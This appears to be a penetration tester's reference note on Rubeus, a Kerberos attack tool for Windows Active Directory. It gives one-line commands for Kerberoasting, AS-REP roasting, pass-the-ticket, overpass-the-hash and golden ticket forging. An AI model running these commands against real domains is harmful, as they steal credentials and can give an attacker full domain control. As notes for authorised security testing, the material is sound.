---
tags: [tool, activedirectory, kerberos]
tool: "rubeus"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# Rubeus - Kerberos Abuse Toolkit

## Tool Overview
Purpose: Windows tool for Kerberos attacks
Location: ~/tools/activedirectory/windows/Rubeus.exe

## When to Use
- Kerberoasting
- AS-REP roasting
- Pass-the-ticket
- Golden/silver tickets
- Overpass-the-hash

## How to Use It

Kerberoasting:
Rubeus.exe kerberoast /outfile:hashes.txt

AS-REP Roasting:
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

Pass the Ticket:
Rubeus.exe ptt /ticket:ticket.kirbi

Overpass the Hash:
Rubeus.exe asktgt /user:admin /ntlm:hash /domain:domain.local

Golden Ticket:
Rubeus.exe golden /krbkey:krbtgt-hash /user:Administrator /domain:domain.local /sid:S-1-5-21-...

## Related Tools
certify, kerbrute
